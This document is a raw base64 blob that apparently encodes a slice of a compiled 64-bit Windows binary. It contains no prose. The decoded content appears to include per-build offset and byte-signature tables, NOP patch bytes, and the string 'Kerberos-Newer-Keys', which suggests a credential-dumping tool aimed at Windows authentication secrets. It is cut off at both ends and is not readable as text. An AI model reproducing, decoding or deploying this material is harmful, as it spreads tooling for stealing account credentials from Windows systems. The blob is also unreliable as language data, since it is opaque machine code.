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AAAAQdgOAAQAAAAYAAAAAAAAA8HUDgAEAAAD8////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAACB2A4ABAAAAAQAAAAAAAABRZQOAAQAAAP7///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAMHYDgAEAAAABAAAAAAAAAFFlA4ABAAAA8P///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAAAAAAAA8dgOAAQAAAAYAAAAAAAAA8HUDgAEAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAAAAAAAAAEh2A4ABAAAAAQAAAAAAAABRZQOAAQAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAAAAAAWHYDgAEAAAABAAAAAAAAAFFlA4ABAAAA/v///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAAAAAAAABgdgOAAQAAAAEAAAAAAAAAUWUDgAEAAADz////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAGh2A4ABAAAABgAAAAAAAADwdQOAAQAAAPX///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAAAAAAAAcHYDgAEAAAAGAAAAAAAAAPB1A4ABAAAA/P///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAACAdgOAAQAAAAEAAAAAAAAAUWUDgAEAAAD+////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAAAAAAJB2A4ABAAAAAQAAAAAAAABRZQOAAQAAAPD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAnHYDgAEAAAAGAAAAAAAAAPB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